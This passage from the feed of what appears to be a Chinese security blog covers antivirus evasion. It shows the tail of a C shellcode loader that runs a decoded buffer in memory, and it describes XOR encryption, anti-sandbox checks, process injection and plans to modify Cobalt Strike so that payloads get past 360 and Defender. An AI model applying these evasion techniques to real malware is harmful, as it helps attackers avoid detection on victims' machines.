decode;</span><br><span class="line">k++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可正常上线</p><p><i>注意用的时候根据自己的 <code>shellcode</code> 长度改一下数组长度</i></p><img src="/2020/12/15/segmentation-shellcode/6.png" style="width:500px;"><br><img src="/2020/12/15/segmentation-shellcode/8.png" style="width:500px;"><p><strong>虚拟机</strong>360跑起来：</p><img src="/2020/12/15/segmentation-shellcode/10.png" style="width:500px;"><img src="/2020/12/15/segmentation-shellcode/11.png" style="width:500px;"><p><strong>补充：</strong></p><p>实测借用师弟的电脑，物理机过了360、defender</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;说个题外话。。。&lt;/p&gt;
&lt;p&gt;测试的时候发现，360放在虚拟机里哪怕给他连上了网。。。简单用异或加密下的 shellcode 能正常上线，最主要的是。。跑mimikatz 360居然动都不动&lt;/p&gt;
&lt;p&gt;但是一旦放到物理机上，刚下下来 马子 就马上被杀。&lt;/p&gt;
&lt;p&gt;这就有点奇葩。。。盲猜360检测了虚拟机环境。。。&lt;/p&gt;
&lt;p&gt;这个分段加密的shellcode 测试了下，实体机上能过 360、defender 上线&lt;/p&gt;</summary>
    
    
    
    <category term="免杀" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="免杀" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>初涉免杀的一些小想法</title>
    <link href="http://example.com/2020/12/13/2020-12-13-sundry/"/>
    <id>http://example.com/2020/12/13/2020-12-13-sundry/</id>
    <published>2020-12-13T14:53:47.000Z</published>
    <updated>2021-01-04T06:11:46.786Z</updated>
    
    <content type="html"><![CDATA[<p>前两天心血来潮尝试玩了下Webshell免杀， 二进制免杀。得出结论Webshell免杀有手就行 [手动狗头]。二进制刚刚初学，推荐 TideSec 的文章：</p><p><a href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></p><span id="more"></span><p>我写的加载器是用 C 写的，简单学了下 XOR 加密、反沙箱和进程注入。实战用师弟的电脑可过  Avast [doge]</p><p>这里有个小问题：360在虚拟机里居然不检测我的马子，但是物理机一下载就秒杀。。。真是奇了怪了。盲猜 360 有虚拟机检测机制</p><p>怼了一会360。</p><p><strong>发现一些些规律：</strong></p><p>1、一层 XOR 的 shellcode 单单放在那里就会被杀</p><p>2、用 C 写了个 Socket 客户端，就单单创建 socket 套接都会被 360 杀</p><p>我写的马带反沙箱、异或值为 31。下载被360秒杀。师弟的就一个 异或，但异或值为 \x71，比我的异或值大很多。下载360识别为未知文件不杀，但执行被杀</p><p><strong>猜测：</strong></p><p>360可能检测了 cs shellcode 的某些特征值，病毒码我已经改成自定义的了应该不是问题。盲猜检测了 shellcode 长度以及 360 尝试过进行 XOR 解密。</p><p><strong>对策：</strong></p><p>现在先把 OSCP 干完。干完后回头再来看看免杀：</p><p><strong>todo：</strong></p><p>1、抓 360 的流量，尝试拦截其自动上传恶意程序，随便看看他是怎么发样本出去的，他认为的特征值有什么。就可以对症下药了</p><p>2、尝试自行修改 cs 的源码，生成的 shellcode 都是固定长度的不太好，尝试修改下。如果能做到内存中分段解密更妙了</p><p>结果玩免杀玩上头了，结果三天没摸 OSCP。。。白浪费了三天的 OSCP lab 时间。。。呜呜呜</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;前两天心血来潮尝试玩了下Webshell免杀， 二进制免杀。得出结论Webshell免杀有手就行 [手动狗头]。二进制刚刚初学，推荐 TideSec 的文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/TideSec/BypassAntiVirus&quot;&gt;https://github.com/TideSec/BypassAntiVirus&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="杂谈" scheme="http://example.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
    <category term="Bypass AV" scheme="http://example.com/tags/Bypass-AV/"/>
    
  </entry>
  
</feed>
